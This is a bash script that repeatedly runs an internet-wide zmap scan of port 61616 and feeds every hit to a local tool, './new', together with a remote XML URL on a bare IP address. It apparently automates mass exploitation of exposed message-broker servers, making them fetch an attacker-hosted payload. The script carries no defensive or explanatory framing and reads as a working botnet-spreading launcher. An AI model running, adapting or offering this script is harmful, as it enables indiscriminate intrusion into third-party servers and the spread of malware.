#!/bin/bash
while true; do
    rm -f x86.txt
    screen -dmS x86 bash -c 'sudo zmap -p61616 -q 2> x86.txt | ./new -u http://196.251.80.145/o.xml -t true'
    echo "Start"
    while ! grep -q "\[INFO\] zmap: completed" x86.txt 2>/dev/null; do
        if ! pgrep -f zmap > /dev/null; then
            break
        fi
        sleep 60
    done
    pkill -f x86
    echo "End"
done
